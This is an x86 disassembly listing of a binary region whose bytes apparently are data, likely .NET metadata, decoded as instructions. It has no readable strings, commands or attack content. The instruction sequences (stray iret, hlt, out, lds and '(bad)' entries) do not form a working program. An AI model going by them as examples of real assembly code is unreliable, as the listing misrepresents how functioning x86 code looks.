  4052c5:	01 c5                	add    %eax,%ebp
  4052c7:	00 21                	add    %ah,(%ecx)
  4052c9:	00 1a                	add    %bl,(%edx)
  4052cb:	02 c5                	add    %ch,%al
  4052cd:	00 21                	add    %ah,(%ecx)
  4052cf:	00 65 0c             	add    %ah,0xc(%ebp)
  4052d2:	cc                   	int3
  4052d3:	07                   	pop    %es
  4052d4:	21 00                	and    %eax,(%eax)
  4052d6:	db 18                	fistpl (%eax)
  4052d8:	c5 00                	lds    (%eax),%eax
  4052da:	21 00                	and    %eax,(%eax)
  4052dc:	c5 18                	lds    (%eax),%ebx
  4052de:	c5 00                	lds    (%eax),%eax
  4052e0:	21 00                	and    %eax,(%eax)
  4052e2:	52                   	push   %edx
  4052e3:	05 c5 00 21 00       	add    $0x2100c5,%eax
  4052e8:	dd 17                	fstl   (%edi)
  4052ea:	cf                   	iret
  4052eb:	07                   	pop    %es
  4052ec:	51                   	push   %ecx
  4052ed:	80 22 16             	andb   $0x16,(%edx)
  4052f0:	af                   	scas   %es:(%edi),%eax
  4052f1:	07                   	pop    %es
  4052f2:	51                   	push   %ecx
  4052f3:	80 0d 16 af 07 36 00 	orb    $0x0,0x3607af16
  4052fa:	bc 03 d3 07 06       	mov    $0x607d303,%esp
  4052ff:	00 6e 09             	add    %ch,0x9(%esi)
  405302:	af                   	scas   %es:(%edi),%eax
  405303:	07                   	pop    %es
  405304:	06                   	push   %es
  405305:	00 4c 10 d7          	add    %cl,-0x29(%eax,%edx,1)
  405309:	07                   	pop    %es
  40530a:	06                   	push   %es
  40530b:	00 9f 13 db 07 01    	add    %bl,0x107db13(%edi)
  405311:	00 e0                	add    %ah,%al
  405313:	00 cc                	add    %cl,%ah
  405315:	07                   	pop    %es
  405316:	01 00                	add    %eax,(%eax)
  405318:	f5                   	cmc
  405319:	01 df                	add    %ebx,%edi
  40531b:	07                   	pop    %es
  40531c:	01 00                	add    %eax,(%eax)
  40531e:	65 02 e3             	gs add %bl,%ah
  405321:	07                   	pop    %es
  405322:	01 00                	add    %eax,(%eax)
  405324:	b5 02                	mov    $0x2,%ch
  405326:	e7 07                	out    %eax,$0x7
  405328:	01 00                	add    %eax,(%eax)
  40532a:	d1 02                	roll   $1,(%edx)
  40532c:	df 07                	filds  (%edi)
  40532e:	01 00                	add    %eax,(%eax)
  405330:	fb                   	sti
  405331:	00 ec                	add    %ch,%ah
  405333:	07                   	pop    %es
  405334:	01 00                	add    %eax,(%eax)
  405336:	ff 01                	incl   (%ecx)
  405338:	f4                   	hlt
  405339:	07                   	pop    %es
  40533a:	06                   	push   %es
  40533b:	00 6e 09             	add    %ch,0x9(%esi)
  40533e:	af                   	scas   %es:(%edi),%eax
  40533f:	07                   	pop    %es
  405340:	06                   	push   %es
  405341:	00 4c 10 d7          	add    %cl,-0x29(%eax,%edx,1)
  405345:	07                   	pop    %es
  405346:	06                   	push   %es
  405347:	00 f8                	add    %bh,%al
  405349:	0e                   	push   %cs
  40534a:	f8                   	clc
  40534b:	07                   	pop    %es
  40534c:	06                   	push   %es
  40534d:	00 9f 13 fc 07 01    	add    %bl,0x107fc13(%edi)
  405353:	00 f0                	add    %dh,%al
  405355:	00 00                	add    %al,(%eax)
  405357:	08 01                	or     %al,(%ecx)
  405359:	00 fb                	add    %bh,%bl
  40535b:	00 f4                	add    %dh,%ah
  40535d:	07                   	pop    %es
  40535e:	36 00 bc 03 05 08 16 	add    %bh,%ss:0x160805(%ebx,%eax,1)
  405365:	00 
  405366:	53                   	push   %ebx
  405367:	00 09                	add    %cl,(%ecx)
  405369:	08 06                	or     %al,(%esi)
  40536b:	00 6e 09             	add    %ch,0x9(%esi)
  40536e:	af                   	scas   %es:(%edi),%eax
  40536f:	07                   	pop    %es
  405370:	06                   	push   %es
  405371:	00 4c 10 14          	add    %cl,0x14(%eax,%edx,1)
  405375:	08 06                	or     %al,(%esi)
  405377:	00 59 10             	add    %bl,0x10(%ecx)
  40537a:	19 08                	sbb    %ecx,(%eax)
  40537c:	06                   	push   %es
  40537d:	00 a3 0b 1c 08 06    	add    %ah,0x6081c0b(%ebx)
  405383:	00 9f 13 fc 07 01    	add    %bl,0x107fc13(%edi)
  405389:	00 ae 00 c5 00 01    	add    %ch,0x100c500(%esi)
  40538f:	00 d1                	add    %dl,%cl
  405391:	01 d3                	add    %edx,%ebx
  405393:	01 01                	add    %eax,(%ecx)
  405395:	00 fb                	add    %bh,%bl
  405397:	00 f4                	add    %dh,%ah
  405399:	07                   	pop    %es
  40539a:	06                   	push   %es
  40539b:	00 6e 09             	add    %ch,0x9(%esi)
  40539e:	af                   	scas   %es:(%edi),%eax
  40539f:	07                   	pop    %es
  4053a0:	06                   	push   %es
  4053a1:	00 4c 10 14          	add    %cl,0x14(%eax,%edx,1)
  4053a5:	08 06                	or     %al,(%esi)
  4053a7:	00 59 10             	add    %bl,0x10(%ecx)
  4053aa:	19 08                	sbb    %ecx,(%eax)
  4053ac:	06                   	push   %es
  4053ad:	00 a3 0b 21 08 06    	add    %ah,0x608210b(%ebx)
  4053b3:	00 9f 13 fc 07 01    	add    %bl,0x107fc13(%edi)
  4053b9:	00 cc                	add    %cl,%ah
  4053bb:	00 d3                	add    %dl,%bl
  4053bd:	01 01                	add    %eax,(%ecx)
  4053bf:	00 c2                	add    %al,%dl
  4053c1:	01 c5                	add    %eax,%ebp
  4053c3:	00 01                	add    %al,(%ecx)
  4053c5:	00 6f 02             	add    %ch,0x2(%edi)
  4053c8:	c5 00                	lds    (%eax),%eax
  4053ca:	01 00                	add    %eax,(%eax)
  4053cc:	c0 02 c5             	rolb   $0xc5,(%edx)
  4053cf:	00 01                	add    %al,(%ecx)
  4053d1:	00 fb                	add    %bh,%bl
  4053d3:	00 f4                	add    %dh,%ah
  4053d5:	07                   	pop    %es
  4053d6:	01 00                	add    %eax,(%eax)
  4053d8:	ff 01                	incl   (%ecx)
  4053da:	26 08 06             	or     %al,%es:(%esi)
  4053dd:	00 6e 09             	add    %ch,0x9(%esi)
  4053e0:	af                   	scas   %es:(%edi),%eax
  4053e1:	07                   	pop    %es
  4053e2:	06                   	push   %es
  4053e3:	00 4c 10 14          	add    %cl,0x14(%eax,%edx,1)
  4053e7:	08 06                	or     %al,(%esi)
  4053e9:	00 59 10             	add    %bl,0x10(%ecx)
  4053ec:	19 08                	sbb    %ecx,(%eax)
  4053ee:	06                   	push   %es
  4053ef:	00 a3 0b 21 08 06    	add    %ah,0x608210b(%ebx)
  4053f5:	00 9f 13 fc 07 01    	add    %bl,0x107fc13(%edi)
  4053fb:	00 ae 00 c5 00 01    	add    %ch,0x100c500(%esi)
  405401:	00 e5                	add    %ah,%ch
  405403:	01 a8 07 01 00 8d    	add    %ebp,-0x72fffef9(%eax)
  405409:	02 a8 07 01 00 a8    	add    -0x57fffef9(%eax),%ch
  40540f:	02 2d 08 01 00 c7    	add    0xc7000108,%ch
  405415:	02 32                	add    (%edx),%dh
  405417:	08 01                	or     %al,(%ecx)
  405419:	00 0a                	add    %cl,(%edx)
  40541b:	03 37                	add    (%edi),%esi
  40541d:	08 01                	or     %al,(%ecx)
  40541f:	00 33                	add    %dh,(%ebx)
  405421:	03 41 08             	add    0x8(%ecx),%eax
  405424:	01 00                	add    %eax,(%eax)
  405426:	57                   	push   %edi
  405427:	03 c5                	add    %ebp,%eax
  405429:	00 01                	add    %al,(%ecx)
  40542b:	00 c0                	add    %al,%al
  40542d:	03 46 08             	add    0x8(%esi),%eax
  405430:	01 00                	add    %eax,(%eax)
  405432:	01 00                	add    %eax,(%eax)
  405434:	c5 00                	lds    (%eax),%eax
  405436:	01 00                	add    %eax,(%eax)
  405438:	71 00                	jno    0x40543a
  40543a:	4b                   	dec    %ebx
  40543b:	08 01                	or     %al,(%ecx)
  40543d:	00 80 01 c5 00 01    	add    %al,0x100c501(%eax)
  405443:	00 4a 02             	add    %cl,0x2(%edx)
  405446:	c5 00                	lds    (%eax),%eax
  405448:	01 00                	add    %eax,(%eax)
  40544a:	fb                   	sti
  40544b:	00 f4                	add    %dh,%ah
  40544d:	07                   	pop    %es
  40544e:	01 00                	add    %eax,(%eax)
  405450:	ff 01                	incl   (%ecx)
  405452:	55                   	push   %ebp
  405453:	08 06                	or     %al,(%esi)
  405455:	00 6e 09             	add    %ch,0x9(%esi)
  405458:	af                   	scas   %es:(%edi),%eax
  405459:	07                   	pop    %es
  40545a:	06                   	push   %es
  40545b:	00 4c 10 14          	add    %cl,0x14(%eax,%edx,1)
  40545f:	08 06                	or     %al,(%esi)
  405461:	00 18                	add    %bl,(%eax)
  405463:	06                   	push   %es
  405464:	c5 00                	lds    (%eax),%eax
  405466:	06                   	push   %es
  405467:	00 e5                	add    %ah,%ch
  405469:	11 5d 08             	adc    %ebx,0x8(%ebp)
  40546c:	06                   	push   %es
  40546d:	00 9f 13 fc 07 01    	add    %bl,0x107fc13(%edi)
  405473:	00 fb                	add    %bh,%bl
  405475:	00 f4                	add    %dh,%ah
  405477:	07                   	pop    %es
  405478:	06                   	push   %es
  405479:	00 6e 09             	add    %ch,0x9(%esi)
  40547c:	af                   	scas   %es:(%edi),%eax
  40547d:	07                   	pop    %es
  40547e:	06                   	push   %es
  40547f:	00 4c 10 14          	add    %cl,0x14(%eax,%edx,1)
  405483:	08 06                	or     %al,(%esi)
  405485:	00 18                	add    %bl,(%eax)
  405487:	06                   	push   %es
  405488:	c5 00                	lds    (%eax),%eax
  40548a:	06                   	push   %es
  40548b:	00 e5                	add    %ah,%ch
  40548d:	11 5d 08             	adc    %ebx,0x8(%ebp)
  405490:	06                   	push   %es
  405491:	00 9f 13 fc 07 01    	add    %bl,0x107fc13(%edi)
  405497:	00 bd 00 67 08 01    	add    %bh,0x1086700(%ebp)
  40549d:	00 fb                	add    %bh,%bl
  40549f:	00 f4                	add    %dh,%ah
  4054a1:	07                   	pop    %es
  4054a2:	50                   	push   %eax
  4054a3:	20 00                	and    %al,(%eax)
  4054a5:	00 00                	add    %al,(%eax)
  4054a7:	00 86 18 59 12 06    	add    %al,0x6125918(%esi)
  4054ad:	00 01                	add    %al,(%ecx)
  4054af:	00 59 20             	add    %bl,0x20(%ecx)
  4054b2:	00 00                	add    %al,(%eax)
  4054b4:	00 00                	add    %al,(%eax)
  4054b6:	86 18                	xchg   %bl,(%eax)
  4054b8:	59                   	pop    %ecx
  4054b9:	12 6c 08 01          	adc    0x1(%eax,%ecx,1),%ch
  4054bd:	00 72 20             	add    %dh,0x20(%edx)
  4054c0:	00 00                	add    %al,(%eax)
  4054c2:	00 00                	add    %al,(%eax)
  4054c4:	86 18                	xchg   %bl,(%eax)
  4054c6:	59                   	pop    %ecx
  4054c7:	12 ec                	adc    %ah,%ch
  4054c9:	05 01 00 82 20       	add    $0x20820001,%eax
  4054ce:	00 00                	add    %al,(%eax)
  4054d0:	00 00                	add    %al,(%eax)
  4054d2:	86 18                	xchg   %bl,(%eax)
  4054d4:	59                   	pop    %ecx
  4054d5:	12 6c 08 01          	adc    0x1(%eax,%ecx,1),%ch
  4054d9:	00 94 20 00 00 00 00 	add    %dl,0x0(%eax,%eiz,1)
  4054e0:	96                   	xchg   %eax,%esi
  4054e1:	00 1f                	add    %bl,(%edi)
  4054e3:	0e                   	push   %cs
  4054e4:	71 08                	jno    0x4054ee
  4054e6:	01 00                	add    %eax,(%eax)
  4054e8:	0c 23                	or     $0x23,%al
  4054ea:	00 00                	add    %al,(%eax)
  4054ec:	00 00                	add    %al,(%eax)
  4054ee:	96                   	xchg   %eax,%esi
  4054ef:	00 85 0f 85 00 02    	add    %al,0x200850f(%ebp)
  4054f5:	00 1a                	add    %bl,(%edx)
  4054f7:	23 00                	and    (%eax),%eax
  4054f9:	00 00                	add    %al,(%eax)
  4054fb:	00 86 18 59 12 06    	add    %al,0x6125918(%esi)
  405501:	00 02                	add    %al,(%edx)
  405503:	00 23                	add    %ah,(%ebx)
  405505:	23 00                	and    (%eax),%eax
  405507:	00 00                	add    %al,(%eax)
  405509:	00 91 18 5f 12 85    	add    %dl,-0x7aeda0e8(%ecx)
  40550f:	00 02                	add    %al,(%edx)
  405511:	00 3c 23             	add    %bh,(%ebx,%eiz,1)
  405514:	00 00                	add    %al,(%eax)
  405516:	00 00                	add    %al,(%eax)
  405518:	96                   	xchg   %eax,%esi
  405519:	00 d3                	add    %dl,%bl
  40551b:	08 77 08             	or     %dh,0x8(%edi)
  40551e:	02 00                	add    (%eax),%al
  405520:	ee                   	out    %al,(%dx)
  405521:	24 00                	and    $0x0,%al
  405523:	00 00                	add    %al,(%eax)
  405525:	00 86 18 59 12 06    	add    %al,0x6125918(%esi)
  40552b:	00 03                	add    %al,(%ebx)
  40552d:	00 00                	add    %al,(%eax)
  40552f:	00 00                	add    %al,(%eax)
  405531:	00 80 00 96 20 8b    	add    %al,-0x74df6a00(%eax)
  405537:	0e                   	push   %cs
  405538:	82 08 03             	orb    $0x3,(%eax)
  40553b:	00 f8                	add    %bh,%al
  40553d:	24 00                	and    $0x0,%al
  40553f:	00 00                	add    %al,(%eax)
  405541:	00 86 00 15 1b 8a    	add    %al,-0x75e4eb00(%esi)
  405547:	08 07                	or     %al,(%edi)
  405549:	00 90 26 00 00 00    	add    %dl,0x26(%eax)
  40554f:	00 86 00 ee 17 06    	add    %al,0x617ee00(%esi)
  405555:	00 0a                	add    %cl,(%edx)
  405557:	00 f5                	add    %dh,%ch
  405559:	26 00 00             	add    %al,%es:(%eax)
  40555c:	00 00                	add    %al,(%eax)
  40555e:	86 18                	xchg   %bl,(%eax)
  405560:	59                   	pop    %ecx
  405561:	12 06                	adc    (%esi),%al
  405563:	00 0a                	add    %cl,(%edx)
  405565:	00 10                	add    %dl,(%eax)
  405567:	27                   	daa
  405568:	00 00                	add    %al,(%eax)
  40556a:	00 00                	add    %al,(%eax)
  40556c:	96                   	xchg   %eax,%esi
  40556d:	00 29                	add    %ch,(%ecx)
  40556f:	13 85 00 0a 00 80    	adc    -0x7ffff600(%ebp),%eax
  405575:	27                   	daa
  405576:	00 00                	add    %al,(%eax)
  405578:	00 00                	add    %al,(%eax)
  40557a:	91                   	xchg   %eax,%ecx
  40557b:	18 5f 12             	sbb    %bl,0x12(%edi)
  40557e:	85 00                	test   %eax,(%eax)
  405580:	0a 00                	or     (%eax),%al
  405582:	dc 27                	fsubl  (%edi)
  405584:	00 00                	add    %al,(%eax)
  405586:	00 00                	add    %al,(%eax)
  405588:	86 18                	xchg   %bl,(%eax)
  40558a:	59                   	pop    %ecx
  40558b:	12 91 08 0a 00 3c    	adc    0x3c000a08(%ecx),%dl
  405591:	28 00                	sub    %al,(%eax)
  405593:	00 00                	add    %al,(%eax)
  405595:	00 86 00 d7 17 06    	add    %al,0x617d700(%esi)
  40559b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40559e:	75 28                	jne    0x4055c8
  4055a0:	00 00                	add    %al,(%eax)
  4055a2:	00 00                	add    %al,(%eax)
  4055a4:	86 00                	xchg   %al,(%eax)
  4055a6:	8f                   	(bad)
  4055a7:	0f 06                	clts
  4055a9:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4055ac:	84 28                	test   %ch,(%eax)
  4055ae:	00 00                	add    %al,(%eax)
  4055b0:	00 00                	add    %al,(%eax)
  4055b2:	86 18                	xchg   %bl,(%eax)
  4055b4:	59                   	pop    %ecx
  4055b5:	12 98 08 0c 00 94    	adc    -0x6bfff3f8(%eax),%bl
  4055bb:	28 00                	sub    %al,(%eax)
  4055bd:	00 00                	add    %al,(%eax)
  4055bf:	00 86 18 59 12 a1    	add    %al,-0x5eeda6e8(%esi)
  4055c5:	08 10                	or     %dl,(%eax)
  4055c7:	00 a8 28 00 00 00    	add    %ch,0x28(%eax)
  4055cd:	00 86 18 59 12 ab    	add    %al,-0x54eda6e8(%esi)
  4055d3:	08 15 00 64 2a 00    	or     %dl,0x2a6400
  4055d9:	00 00                	add    %al,(%eax)
  4055db:	00 86 00 d7 17 01    	add    %al,0x117d700(%esi)
  4055e1:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4055e4:	98                   	cwtl
  4055e5:	2b 00                	sub    (%eax),%eax
  4055e7:	00 00                	add    %al,(%eax)
  4055e9:	00 86 00 8f 0f 06    	add    %al,0x60f8f00(%esi)
  4055ef:	00 1d 00 06 2c 00    	add    %bl,0x2c0600
  4055f5:	00 00                	add    %al,(%eax)
  4055f7:	00 e6                	add    %ah,%dh
  4055f9:	01 c2                	add    %eax,%edx
  4055fb:	08 06                	or     %al,(%esi)
  4055fd:	00 1d 00 10 2c 00    	add    %bl,0x2c1000
  405603:	00 00                	add    %al,(%eax)
  405605:	00 81 00 a8 18 b8    	add    %al,-0x47e75800(%ecx)
  40560b:	08 1d 00 64 2c 00    	or     %bl,0x2c6400
  405611:	00 00                	add    %al,(%eax)
  405613:	00 81 00 49 18 c2    	add    %al,-0x3de7b700(%ecx)
  405619:	08 1f                	or     %bl,(%edi)
  40561b:	00 b8 2c 00 00 00    	add    %bh,0x2c(%eax)
  405621:	00 81 00 9c 08 c2    	add    %al,-0x3df76400(%ecx)
  405627:	08 21                	or     %ah,(%ecx)
  405629:	00 0c 2d 00 00 00 00 	add    %cl,0x0(,%ebp,1)
  405630:	81 00 94 06 cc 08    	addl   $0x8cc0694,(%eax)
  405636:	23 00                	and    (%eax),%eax
  405638:	60                   	pusha
  405639:	2d 00 00 00 00       	sub    $0x0,%eax
  40563e:	81 00 85 06 cc 08    	addl   $0x8cc0685,(%eax)
  405644:	25 00 b4 2d 00       	and    $0x2db400,%eax
  405649:	00 00                	add    %al,(%eax)
  40564b:	00 81 00 35 00 9f    	add    %al,-0x60ffcb00(%ecx)
  405651:	04 27                	add    $0x27,%al
  405653:	00 f4                	add    %dh,%ah
  405655:	2d 00 00 00 00       	sub    $0x0,%eax
  40565a:	96                   	xchg   %eax,%esi
  40565b:	00 00                	add    %al,(%eax)
  40565d:	09 db                	or     %ebx,%ebx
  40565f:	08 28                	or     %ch,(%eax)
  405661:	00 5c 2e 00          	add    %bl,0x0(%esi,%ebp,1)
  405665:	00 00                	add    %al,(%eax)
  405667:	00 96 00 0e 08 e1    	add    %dl,-0x1ef7f200(%esi)
  40566d:	08 29                	or     %ch,(%ecx)
  40566f:	00 8c 2e 00 00 00 00 	add    %cl,0x0(%esi,%ebp,1)
  405676:	96                   	xchg   %eax,%esi
  405677:	00 f9                	add    %bh,%cl
  405679:	07                   	pop    %es
  40567a:	e1 08                	loope  0x405684
  40567c:	2a 00                	sub    (%eax),%al
  40567e:	bc 2e 00 00 00       	mov    $0x2e,%esp
  405683:	00 91 00 10 09 e7    	add    %dl,-0x18f6f000(%ecx)
  405689:	08 2b                	or     %ch,(%ebx)
  40568b:	00 ac 30 00 00 00 00 	add    %ch,0x0(%eax,%esi,1)
  405692:	91                   	xchg   %eax,%ecx
  405693:	00 a9 19 fa 08 33    	add    %ch,0x3308fa19(%ecx)
  405699:	00 50 31             	add    %dl,0x31(%eax)
  40569c:	00 00                	add    %al,(%eax)
  40569e:	00 00                	add    %al,(%eax)
  4056a0:	86 18                	xchg   %bl,(%eax)
  4056a2:	59                   	pop    %ecx
  4056a3:	12 06                	adc    (%esi),%al
  4056a5:	00 35 00 59 31 00    	add    %dh,0x315900
  4056ab:	00 00                	add    %al,(%eax)
  4056ad:	00 91 18 5f 12 85    	add    %dl,-0x7aeda0e8(%ecx)
  4056b3:	00 35 00 65 31 00    	add    %dh,0x316500
  4056b9:	00 00                	add    %al,(%eax)
  4056bb:	00 86 18 59 12 06    	add    %al,0x6125918(%esi)
  4056c1:	00 35 00 6e 31 00    	add    %dh,0x316e00
  4056c7:	00 00                	add    %al,(%eax)
  4056c9:	00 83 00 44 00 19    	add    %al,0x19004400(%ebx)
  4056cf:	05 35 00 80 31       	add    $0x31800035,%eax
  4056d4:	00 00                	add    %al,(%eax)
  4056d6:	00 00                	add    %al,(%eax)
  4056d8:	86 18                	xchg   %bl,(%eax)
  4056da:	59                   	pop    %ecx
  4056db:	12 06                	adc    (%esi),%al
  4056dd:	00 36                	add    %dh,(%esi)
  4056df:	00 8c 31 00 00 00 00 	add    %cl,0x0(%ecx,%esi,1)
  4056e6:	e1 01                	loope  0x4056e9
  4056e8:	f7 18                	negl   (%eax)
  4056ea:	06                   	push   %es
  4056eb:	00 36                	add    %dh,(%esi)
  4056ed:	00 b4 33 00 00 00 00 	add    %dh,0x0(%ebx,%esi,1)
  4056f4:	e1 01                	loope  0x4056f7
  4056f6:	8f 07                	pop    (%edi)
  4056f8:	21 00                	and    %eax,(%eax)
  4056fa:	36 00 b6 33 00 00 00 	add    %dh,%ss:0x33(%esi)
  405701:	00 86 18 59 12 06    	add    %al,0x6125918(%esi)
  405707:	00 37                	add    %dh,(%edi)
  405709:	00 c0                	add    %al,%al
  40570b:	33 00                	xor    (%eax),%eax
  40570d:	00 00                	add    %al,(%eax)
  40570f:	00 e1                	add    %ah,%cl
  405711:	01 f7                	add    %esi,%edi
  405713:	18 06                	sbb    %al,(%esi)
  405715:	00 37                	add    %dh,(%edi)
  405717:	00 7c 35 00          	add    %bh,0x0(%ebp,%esi,1)
  40571b:	00 00                	add    %al,(%eax)
  40571d:	00 e1                	add    %ah,%cl
  40571f:	01 8f 07 21 00 37    	add    %ecx,0x37002107(%edi)
  405725:	00 7e 35             	add    %bh,0x35(%esi)
  405728:	00 00                	add    %al,(%eax)
  40572a:	00 00                	add    %al,(%eax)
  40572c:	91                   	xchg   %eax,%ecx
  40572d:	18 5f 12             	sbb    %bl,0x12(%edi)
  405730:	85 00                	test   %eax,(%eax)
  405732:	38 00                	cmp    %al,(%eax)
  405734:	8a 35 00 00 00 00    	mov    0x0,%dh
  40573a:	86 18                	xchg   %bl,(%eax)
  40573c:	59                   	pop    %ecx
  40573d:	12 06                	adc    (%esi),%al
  40573f:	00 38                	add    %bh,(%eax)
  405741:	00 93 35 00 00 00    	add    %dl,0x35(%ebx)
  405747:	00 83 00 5d 00 05    	add    %al,0x5005d00(%ebx)
  40574d:	09 38                	or     %edi,(%eax)
  40574f:	00 aa 35 00 00 00    	add    %ch,0x35(%edx)
  405755:	00 86 18 59 12 06    	add    %al,0x6125918(%esi)
  40575b:	00 39                	add    %bh,(%ecx)
  40575d:	00 b4 35 00 00 00 00 	add    %dh,0x0(%ebp,%esi,1)
  405764:	e1 01                	loope  0x405767
  405766:	f7 18                	negl   (%eax)
  405768:	06                   	push   %es
  405769:	00 39                	add    %bh,(%ecx)
  40576b:	00 88 37 00 00 00    	add    %cl,0x37(%eax)
  405771:	00 e1                	add    %ah,%cl
  405773:	01 8f 07 21 00 39    	add    %ecx,0x39002107(%edi)
  405779:	00 8a 37 00 00 00    	add    %cl,0x37(%edx)
  40577f:	00 86 18 59 12 06    	add    %al,0x6125918(%esi)
  405785:	00 3a                	add    %bh,(%edx)
  405787:	00 94 37 00 00 00 00 	add    %dl,0x0(%edi,%esi,1)
  40578e:	e1 01                	loope  0x405791
  405790:	f7 18                	negl   (%eax)
  405792:	06                   	push   %es
  405793:	00 3a                	add    %bh,(%edx)
  405795:	00 04 40             	add    %al,(%eax,%eax,2)
  405798:	00 00                	add    %al,(%eax)
  40579a:	00 00                	add    %al,(%eax)
  40579c:	e1 01                	loope  0x40579f
  40579e:	8f 07                	pop    (%edi)
  4057a0:	21 00                	and    %eax,(%eax)
  4057a2:	3a 00                	cmp    (%eax),%al
  4057a4:	06                   	push   %es
  4057a5:	40                   	inc    %eax
  4057a6:	00 00                	add    %al,(%eax)
  4057a8:	00 00                	add    %al,(%eax)
  4057aa:	86 18                	xchg   %bl,(%eax)
  4057ac:	59                   	pop    %ecx
  4057ad:	12 06                	adc    (%esi),%al
  4057af:	00 3b                	add    %bh,(%ebx)
  4057b1:	00 10                	add    %dl,(%eax)
  4057b3:	40                   	inc    %eax
  4057b4:	00 00                	add    %al,(%eax)
  4057b6:	00 00                	add    %al,(%eax)
  4057b8:	e1 01                	loope  0x4057bb
  4057ba:	f7 18                	negl   (%eax)
  4057bc:	06                   	push   %es
  4057bd:	00 3b                	add    %bh,(%ebx)
  4057bf:	00 d8                	add    %bl,%al
  4057c1:	4a                   	dec    %edx
  4057c2:	00 00                	add    %al,(%eax)
  4057c4:	00 00                	add    %al,(%eax)
  4057c6:	e1 01                	loope  0x4057c9
  4057c8:	8f 07                	pop    (%edi)
  4057ca:	21 00                	and    %eax,(%eax)
  4057cc:	3b 00                	cmp    (%eax),%eax
  4057ce:	da 4a 00             	fimull 0x0(%edx)
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 86 18 59 12 06    	add    %al,0x6125918(%esi)
  4057d9:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4057dc:	e4 4a                	in     $0x4a,%al
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	00 00                	add    %al,(%eax)
  4057e2:	e1 01                	loope  0x4057e5
  4057e4:	f7 18                	negl   (%eax)
  4057e6:	06                   	push   %es
  4057e7:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4057ea:	c0 4b 00 00          	rorb   $0x0,0x0(%ebx)
  4057ee:	00 00                	add    %al,(%eax)
  4057f0:	e1 01                	loope  0x4057f3
  4057f2:	8f 07                	pop    (%edi)
  4057f4:	21 00                	and    %eax,(%eax)
  4057f6:	3c 00                	cmp    $0x0,%al
  4057f8:	c2 4b 00             	ret    $0x4b
  4057fb:	00 00                	add    %al,(%eax)
  4057fd:	00 86 18 59 12 06    	add    %al,0x6125918(%esi)
  405803:	00 3d 00 cc 4b 00    	add    %bh,0x4bcc00
  405809:	00 00                	add    %al,(%eax)
  40580b:	00 e1                	add    %ah,%cl
  40580d:	01 f7                	add    %esi,%edi
  40580f:	18 06                	sbb    %al,(%esi)
  405811:	00 3d 00 f8 4c 00    	add    %bh,0x4cf800
  405817:	00 00                	add    %al,(%eax)
  405819:	00 e1                	add    %ah,%cl
  40581b:	01 8f 07 21 00 3d    	add    %ecx,0x3d002107(%edi)
  405821:	00 00                	add    %al,(%eax)
  405823:	00 01                	add    %al,(%ecx)
  405825:	00 9a 13 00 00 01    	add    %bl,0x1000013(%edx)
  40582b:	00 9a 13 00 00 01    	add    %bl,0x1000013(%edx)
  405831:	00 6b 16             	add    %ch,0x16(%ebx)
  405834:	00 00                	add    %al,(%eax)
  405836:	02 00                	add    (%eax),%al
  405838:	9d                   	popf
  405839:	0e                   	push   %cs
  40583a:	00 00                	add    %al,(%eax)
  40583c:	03 00                	add    (%eax),%eax
  40583e:	60                   	pusha
  40583f:	10 00                	adc    %al,(%eax)
  405841:	00 04 00             	add    %al,(%eax,%eax,1)
  405844:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405845:	0c 00                	or     $0x0,%al
  405847:	00 01                	add    %al,(%ecx)
  405849:	00 e4                	add    %ah,%ah
  40584b:	18 00                	sbb    %al,(%eax)
  40584d:	00 02                	add    %al,(%edx)
  40584f:	00 11                	add    %dl,(%ecx)
  405851:	18 00                	sbb    %al,(%eax)
  405853:	00 03                	add    %al,(%ebx)
  405855:	00 5d 04             	add    %bl,0x4(%ebp)
  405858:	00 00                	add    %al,(%eax)
  40585a:	01 00                	add    %eax,(%eax)
  40585c:	11 18                	adc    %ebx,(%eax)
  40585e:	00 00                	add    %al,(%eax)
  405860:	02 00                	add    (%eax),%al
  405862:	fc                   	cld
  405863:	04 00                	add    $0x0,%al
  405865:	00 01                	add    %al,(%ecx)
  405867:	00 db                	add    %bl,%bl
  405869:	18 00                	sbb    %al,(%eax)
  40586b:	00 02                	add    %al,(%edx)
  40586d:	00 fc                	add    %bh,%ah
  40586f:	04 00                	add    $0x0,%al
  405871:	00 03                	add    %al,(%ebx)
  405873:	00 c0                	add    %al,%al
  405875:	06                   	push   %es
  405876:	00 00                	add    %al,(%eax)
  405878:	04 00                	add    $0x0,%al
  40587a:	52                   	push   %edx
  40587b:	05 00 00 01 00       	add    $0x10000,%eax
  405880:	db 18                	fistpl (%eax)
  405882:	00 00                	add    %al,(%eax)
  405884:	02 00                	add    (%eax),%al
  405886:	fc                   	cld
  405887:	04 00                	add    $0x0,%al
  405889:	00 03                	add    %al,(%ebx)
  40588b:	00 c0                	add    %al,%al
  40588d:	06                   	push   %es
  40588e:	00 00                	add    %al,(%eax)
  405890:	04 00                	add    $0x0,%al
  405892:	52                   	push   %edx
  405893:	05 00 00 05 00       	add    $0x50000,%eax
  405898:	6d                   	insl   (%dx),%es:(%edi)
  405899:	0c 00                	or     $0x0,%al
  40589b:	00 01                	add    %al,(%ecx)
  40589d:	00 db                	add    %bl,%bl
  40589f:	18 00                	sbb    %al,(%eax)
  4058a1:	00 02                	add    %al,(%edx)
  4058a3:	00 fc                	add    %bh,%ah
  4058a5:	04 00                	add    $0x0,%al
  4058a7:	00 03                	add    %al,(%ebx)
  4058a9:	00 c0                	add    %al,%al
  4058ab:	06                   	push   %es
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	04 00                	add    $0x0,%al
  4058b0:	52                   	push   %edx
  4058b1:	05 00 00 05 00       	add    $0x50000,%eax
  4058b6:	6d                   	insl   (%dx),%es:(%edi)
  4058b7:	0c 00                	or     $0x0,%al
  4058b9:	00 06                	add    %al,(%esi)
  4058bb:	00 c5                	add    %al,%ch
  4058bd:	18 00                	sbb    %al,(%eax)
  4058bf:	00 07                	add    %al,(%edi)
  4058c1:	00 e9                	add    %ch,%cl
  4058c3:	17                   	pop    %ss
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	01 00                	add    %eax,(%eax)
  4058c8:	06                   	push   %es
  4058c9:	18 00                	sbb    %al,(%eax)
  4058cb:	00 01                	add    %al,(%ecx)
  4058cd:	00 59 10             	add    %bl,0x10(%ecx)
  4058d0:	00 00                	add    %al,(%eax)
